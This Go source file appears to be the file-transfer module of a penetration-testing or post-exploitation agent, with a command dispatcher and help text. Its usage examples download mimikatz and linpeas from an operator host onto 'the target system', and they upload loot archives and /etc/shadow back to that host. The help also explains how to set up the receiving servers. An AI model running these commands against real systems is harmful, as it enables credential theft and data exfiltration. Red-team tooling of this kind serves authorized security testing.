package transfer

import (
	"fmt"
)

// TransferCommand handles file upload and download operations
// Usage:
//
//	download <url> <destination>    - Download file from HTTP server
//	upload <source> <url>            - Upload file to HTTP server
func TransferCommand(args []string) string {
	if len(args) < 1 {
		return helpText()
	}

	action := args[0]

	switch action {
	case "download":
		if len(args) < 3 {
			return "Usage: download <url> <destination>\n" +
				"Example: download http://10.10.14.5:8080/mimikatz.exe C:\\Tools\\mimikatz.exe\n"
		}
		url := args[1]
		destination := args[2]
		return DownloadFile(url, destination)

	case "upload":
		if len(args) < 3 {
			return "Usage: upload <source> <url>\n" +
				"Example: upload C:\\loot.zip http://10.10.14.5:8080/upload\n"
		}
		source := args[1]
		url := args[2]
		return UploadFile(source, url)

	case "help", "--help", "-h":
		return helpText()

	default:
		return fmt.Sprintf("Unknown transfer action: %s\nUse 'transfer help' for usage information.\n", action)
	}
}

func helpText() string {
	return `
File Transfer Commands
======================

Usage: transfer <action> [arguments]

Actions:

  download <url> <destination>
    Download a file from an HTTP server to the target system.
    
    Arguments:
      url          - HTTP/HTTPS URL of the file to download
      destination  - Local path where file will be saved
    
    Example:
      transfer download http://10.10.14.5:8080/mimikatz.exe C:\Temp\mimi.exe
      transfer download http://192.168.1.10/linpeas.sh /tmp/linpeas.sh

  upload <source> <url>
    Upload a file from the target system to an HTTP server.
    
    Arguments:
      source - Local file path to upload
      url    - HTTP/HTTPS endpoint that accepts POST requests
    
    Example:
      transfer upload C:\Windows\Temp\loot.zip http://10.10.14.5:8080/upload
      transfer upload /etc/shadow http://192.168.1.10:8080/upload

  help
    Show this help message.

Setup on Operator Machine:
==========================

For DOWNLOAD (serving files to target):
  python3 -m http.server 8080
  # or
  python -m SimpleHTTPServer 8080

For UPLOAD (receiving files from target):
  # Use updog (pip install updog)
  updog -p 8080
  
  # or PHP
  php -S 0.0.0.0:8080
  
  # or custom Python server (see project docs)

Notes:
======
- Files are transferred over HTTP (not encrypted)
- Use only on authorized systems
- Large files may take time depending on connection
- Upload requires server that accepts POST with multipart/form-data

For encrypted transfers, use HTTPS URLs (requires valid certificate).
`
}
